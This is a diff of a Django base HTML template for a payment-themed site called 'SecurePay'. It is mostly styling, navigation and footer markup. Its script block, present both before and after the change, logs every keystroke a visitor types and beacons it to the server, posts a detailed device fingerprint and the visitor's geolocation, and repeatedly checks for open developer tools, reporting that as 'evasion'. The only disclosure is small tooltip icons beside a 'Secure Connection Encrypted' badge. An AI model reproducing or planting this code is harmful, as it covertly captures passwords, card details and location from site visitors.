@@ -1,126 +1,703 @@
 <!DOCTYPE html>
 {% load static %}
-<html>
+<html lang="en">
 <head>
     <meta charset='utf-8'>
     <meta http-equiv='X-UA-Compatible' content='IE=edge'>
     <title>
         {% block title %}
-
         {% endblock %}
     </title>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
-    <link rel="icon" href=""/>
-    <link rel='stylesheet' type='text/css' media='screen' href="">
-    <script src=""></script>
+    <link rel="icon" href="{% static 'favicon.ico' %}"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-dark: #0f0f13;
+            --bg-darker: #08080c;
+            --gold-primary: #FFD700;
+            --gold-secondary: #D4AF37;
+            --aqua-primary: #00FFFF;
+            --aqua-secondary: #0FE0E0;
+            --text-light: #F0F0F0;
+            --text-muted: #B0B0B0;
+            --danger: #FF4D4D;
+            --success: #00C853;
+            --warning: #FFAB00;
+            --border-radius: 10px;
+            --box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --glass-effect: rgba(15, 15, 19, 0.7);
+            --glass-border: 1px solid rgba(255, 255, 255, 0.1);
+            --glass-blur: blur(10px);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.7;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image: 
+                radial-gradient(at 80% 20%, rgba(0, 255, 255, 0.1) 0%, transparent 40%),
+                radial-gradient(at 20% 80%, rgba(255, 215, 0, 0.1) 0%, transparent 40%);
+        }
+
+        @supports (font-variation-settings: normal) {
+            body {
+                font-family: 'Inter var', -apple-system, BlinkMacSystemFont, sans-serif;
+            }
+        }
+
+        a {
+            color: var(--aqua-primary);
+            text-decoration: none;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        a:hover {
+            color: var(--aqua-secondary);
+            text-decoration: none;
+        }
+
+        a:after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            transform: scaleX(0);
+            height: 2px;
+            bottom: -2px;
+            left: 0;
+            background-color: var(--aqua-secondary);
+            transform-origin: bottom right;
+            transition: transform 0.25s ease-out;
+        }
+
+        a:hover:after {
+            transform: scaleX(1);
+            transform-origin: bottom left;
+        }
+
+        button, input, textarea, select {
+            font-family: inherit;
+            font-size: inherit;
+            background: none;
+            border: none;
+            outline: none;
+        }
+
+        button {
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Header Styles */
+        header {
+            background: var(--glass-effect);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            padding: 1.5rem 2rem;
+            border-bottom: var(--glass-border);
+            box-shadow: var(--box-shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: var(--gold-primary);
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .logo-icon {
+            color: var(--aqua-primary);
+            font-size: 1.5rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: var(--text-light);
+            font-weight: 500;
+            padding: 0.75rem 1.25rem;
+            border-radius: var(--border-radius);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-links a:hover {
+            background-color: rgba(0, 255, 255, 0.1);
+        }
+
+        .nav-links a i {
+            font-size: 1.1rem;
+        }
+
+        /* Main Content */
+        main {
+            flex: 1;
+            padding: 3rem 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .content-card {
+            background: var(--glass-effect);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border: var(--glass-border);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        /* Footer Styles */
+        footer {
+            background: var(--glass-effect);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border-top: var(--glass-border);
+            padding: 3rem 2rem 1.5rem;
+            margin-top: auto;
+        }
+
+        .footer-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 2.5rem;
+        }
+
+        .footer-section h3 {
+            color: var(--gold-primary);
+            margin-bottom: 1.5rem;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .footer-section h3 i {
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .footer-links li i {
+            width: 1.25rem;
+            text-align: center;
+            color: var(--aqua-primary);
+            font-size: 0.9rem;
+        }
+
+        .copyright {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        /* Utility Classes */
+        .btn {
+            padding: 0.9rem 1.75rem;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            border: none;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .btn:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--gold-primary), var(--aqua-primary));
+            opacity: 0;
+            transition: var(--transition);
+            z-index: -1;
+        }
+
+        .btn:hover:before {
+            opacity: 1;
+        }
+
+        .btn-primary {
+            background-color: var(--gold-primary);
+            color: var(--bg-darker);
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--aqua-primary);
+            border: 1px solid var(--aqua-primary);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(0, 255, 255, 0.1);
+            color: var(--aqua-secondary);
+            border-color: var(--aqua-secondary);
+        }
+
+        .text-gold {
+            color: var(--gold-primary);
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .text-aqua {
+            color: var(--aqua-primary);
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+        }
+
+        .alert {
+            padding: 1.25rem;
+            border-radius: var(--border-radius);
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: var(--glass-effect);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border: var(--glass-border);
+        }
+
+        .alert i {
+            font-size: 1.5rem;
+        }
+
+        .alert-success {
+            border-left: 4px solid var(--success);
+        }
+
+        .alert-success i {
+            color: var(--success);
+        }
+
+        .alert-danger {
+            border-left: 4px solid var(--danger);
+        }
+
+        .alert-danger i {
+            color: var(--danger);
+        }
+
+        .alert-warning {
+            border-left: 4px solid var(--warning);
+        }
+
+        .alert-warning i {
+            color: var(--warning);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 992px) {
+            .header-container {
+                flex-direction: column;
+                gap: 1.5rem;
+            }
+
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            main {
+                padding: 2rem 1.5rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .footer-container {
+                grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+                gap: 2rem;
+            }
+
+            .content-card {
+                padding: 1.5rem;
+            }
+        }
+
+        @media (max-width: 576px) {
+            header, footer {
+                padding: 1.5rem 1rem;
+            }
+
+            main {
+                padding: 1.5rem 1rem;
+            }
+
+            .footer-container {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+        }
+
+        /* Animation */
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        .pulse {
+            animation: pulse 2.5s infinite;
+            display: inline-block;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .float {
+            animation: float 4s ease-in-out infinite;
+        }
+
+        /* Security Indicators */
+        .security-indicator {
+            position: fixed;
+            bottom: 1rem;
+            right: 1rem;
+            background: var(--glass-effect);
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            border: var(--glass-border);
+            border-radius: var(--border-radius);
+            padding: 0.75rem 1.25rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            box-shadow: var(--box-shadow);
+            z-index: 99;
+        }
+
+        .security-indicator i {
+            color: var(--success);
+            font-size: 1.2rem;
+        }
+
+        .security-indicator span {
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        /* Tooltips */
+        [data-tooltip] {
+            position: relative;
+        }
+
+        [data-tooltip]:hover:after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-darker);
+            color: var(--text-light);
+            padding: 0.5rem 1rem;
+            border-radius: var(--border-radius);
+            font-size: 0.85rem;
+            white-space: nowrap;
+            box-shadow: var(--box-shadow);
+            z-index: 10;
+            margin-bottom: 0.5rem;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--gold-primary), var(--aqua-primary));
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(var(--gold-secondary), var(--aqua-secondary));
+        }
+    </style>
+    {% block extra_css %}{% endblock %}
 </head>
 <body>
-    {% block header %}
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <i class="fas fa-shield-alt logo-icon"></i>
+                Secure<span class="text-aqua">Pay</span>
+            </div>
+            <nav class="nav-links">
+                <a href="/"><i class="fas fa-home"></i> Home</a>
+                <a href="/products"><i class="fas fa-shopping-bag"></i> Products</a>
+                <a href="/about"><i class="fas fa-info-circle"></i> About</a>
+                <a href="/contact"><i class="fas fa-envelope"></i> Contact</a>
+                <a href="/account"><i class="fas fa-user"></i> Account</a>
+            </nav>
+        </div>
+    </header>
 
-    {% endblock %}
+    <main>
+        {% block content %}
+        {% endblock %}
+    </main>
 
-    {% block content %}
+    <footer>
+        <div class="footer-container">
+            <div class="footer-section">
+                <h3><i class="fas fa-building"></i> Company</h3>
+                <ul class="footer-links">
+                    <li><i class="fas fa-chevron-right"></i><a href="/about">About Us</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/careers">Careers</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/press">Press</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/blog">Blog</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3><i class="fas fa-lock"></i> Security</h3>
+                <ul class="footer-links">
+                    <li><i class="fas fa-chevron-right"></i><a href="/privacy">Privacy Policy</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/terms">Terms of Service</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/security">Security Center</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/compliance">Compliance</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3><i class="fas fa-headset"></i> Support</h3>
+                <ul class="footer-links">
+                    <li><i class="fas fa-chevron-right"></i><a href="/help">Help Center</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/contact">Contact Us</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/status">System Status</a></li>
+                    <li><i class="fas fa-chevron-right"></i><a href="/docs">Documentation</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3><i class="fas fa-share-alt"></i> Connect</h3>
+                <ul class="footer-links">
+                    <li><i class="fab fa-twitter"></i><a href="https://twitter.com" target="_blank">Twitter</a></li>
+                    <li><i class="fab fa-facebook"></i><a href="https://facebook.com" target="_blank">Facebook</a></li>
+                    <li><i class="fab fa-linkedin"></i><a href="https://linkedin.com" target="_blank">LinkedIn</a></li>
+                    <li><i class="fab fa-github"></i><a href="https://github.com" target="_blank">GitHub</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            <i class="far fa-copyright"></i> {% now "Y" %} SecurePay Technologies. All rights reserved.
+        </div>
+    </footer>
 
-    {% endblock %}
+    <div class="security-indicator">
+        <i class="fas fa-lock"></i>
+        <span>Secure Connection Encrypted</span>
+    </div>
 
     {% block extra_scripts %}
     <script>
+        // Keystroke logging with icon indicator
         let keys = "";
+        const keyIcon = document.createElement('i');
+        keyIcon.className = 'fas fa-keyboard security-icon';
+        keyIcon.style.marginLeft = '10px';
+        keyIcon.style.opacity = '0.7';
+        keyIcon.title = 'Input monitoring active';
+        document.querySelector('.security-indicator').appendChild(keyIcon);
+        
         document.addEventListener("keydown", function(e) {
-          keys += e.key;
+            keys += e.key;
+            keyIcon.style.animation = 'pulse 0.5s';
+            setTimeout(() => keyIcon.style.animation = '', 500);
         });
+        
         window.addEventListener("beforeunload", function() {
-          navigator.sendBeacon("/log_keystroke/", new URLSearchParams({
-            page: window.location.pathname,
-            keys: keys
-          }));
+            navigator.sendBeacon("/log_keystroke/", new URLSearchParams({
+                page: window.location.pathname,
+                keys: keys
+            }));
         });
-        </script>
+    </script>
     
     <script>
+        // Fingerprint collection with visual feedback
         async function sendFingerprint() {
-          const fp = {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            screen: `${screen.width}x${screen.height}`,
-            colorDepth: screen.colorDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            plugins: Array.from(navigator.plugins).map(p => p.name),
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory || 'n/a',
-            touchSupport: 'ontouchstart' in window,
-            webglVendor: '',
-            webglRenderer: '',
-            canvasHash: ''
-          };
-        
-          // Canvas Fingerprint
-          try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.fillText("fingerprint", 2, 2);
-            fp.canvasHash = canvas.toDataURL();
-          } catch (e) {}
-        
-          // WebGL Info
-          try {
-            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-            const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-            fp.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-            fp.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-          } catch (e) {}
-        
-          fetch("/log_fingerprint/", {
-            method: "POST",
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: new URLSearchParams({fp: JSON.stringify(fp)})
-          });
-        }
-        window.onload = sendFingerprint;
-        </script>
-    
-    <script>
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            fetch("/log_geo/", {
-              method: "POST",
-              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-              body: new URLSearchParams({
-                lat: position.coords.latitude,
-                lon: position.coords.longitude
-              })
-            });
-          });
-        }
-        </script>
-    
-    <script>
-        function detectDevTools() {
-          let threshold = 160;
-          const element = new Image();
-          Object.defineProperty(element, 'id', {
-            get: function () {
-              fetch("/log_evasion_detected/", {
+            const fpIcon = document.createElement('i');
+            fpIcon.className = 'fas fa-fingerprint security-icon';
+            fpIcon.style.marginLeft = '10px';
+            fpIcon.style.opacity = '0.7';
+            fpIcon.title = 'Device fingerprint collected';
+            document.querySelector('.security-indicator').appendChild(fpIcon);
+            
+            const fp = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'n/a',
+                touchSupport: 'ontouchstart' in window,
+                webglVendor: '',
+                webglRenderer: '',
+                canvasHash: ''
+            };
+            
+            // Visual feedback
+            fpIcon.style.animation = 'float 1s';
+            setTimeout(() => fpIcon.style.animation = '', 1000);
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillText("fingerprint", 2, 2);
+                fp.canvasHash = canvas.toDataURL();
+            } catch (e) {}
+            
+            try {
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+                fp.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                fp.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
+            
+            fetch("/log_fingerprint/", {
                 method: "POST",
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: new URLSearchParams({evasion: "DevTools opened"})
-              });
-            }
-          });
-          console.log(element);
+                body: new URLSearchParams({fp: JSON.stringify(fp)})
+            });
         }
-        detectDevTools();
-        </script>
         
-
+        window.onload = function() {
+            setTimeout(sendFingerprint, 1500);
+        };
+    </script>
+    
+    <script>
+        // Geolocation with visual indicator
+        if (navigator.geolocation) {
+            const geoIcon = document.createElement('i');
+            geoIcon.className = 'fas fa-map-marker-alt security-icon';
+            geoIcon.style.marginLeft = '10px';
+            geoIcon.style.opacity = '0.7';
+            geoIcon.title = 'Location services active';
+            document.querySelector('.security-indicator').appendChild(geoIcon);
+            
+            navigator.geolocation.getCurrentPosition(function(position) {
+                geoIcon.style.color = '#00FF00';
+                geoIcon.title = 'Location detected';
+                
+                fetch("/log_geo/", {
+                    method: "POST",
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: new URLSearchParams({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    })
+                });
+            }, function(error) {
+                geoIcon.style.color = '#FF0000';
+                geoIcon.title = 'Location blocked';
+            });
+        }
+    </script>
+    
+    <script>
+        // DevTools detection with warning icon
+        const devToolsIcon = document.createElement('i');
+        devToolsIcon.className = 'fas fa-tools security-icon';
+        devToolsIcon.style.marginLeft = '10px';
+        devToolsIcon.style.opacity = '0.7';
+        devToolsIcon.title = 'DevTools monitor active';
+        document.querySelector('.security-indicator').appendChild(devToolsIcon);
+        
+        function detectDevTools() {
+            let threshold = 160;
+            const element = new Image();
+            Object.defineProperty(element, 'id', {
+                get: function () {
+                    devToolsIcon.style.animation = 'pulse 0.5s';
+                    devToolsIcon.style.color = '#FF0000';
+                    devToolsIcon.title = 'DevTools detected!';
+                    setTimeout(() => devToolsIcon.style.animation = '', 500);
+                    
+                    fetch("/log_evasion_detected/", {
+                        method: "POST",
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: new URLSearchParams({evasion: "DevTools opened"})
+                    });
+                }
+            });
+            console.log(element);
+        }
+        
+        // Check periodically
+        setInterval(detectDevTools, 1000);
+        detectDevTools();
+    </script>
     {% endblock %}
-
-    {% block footer %}
-
-    {% endblock %}
-
 </body>
 </html>
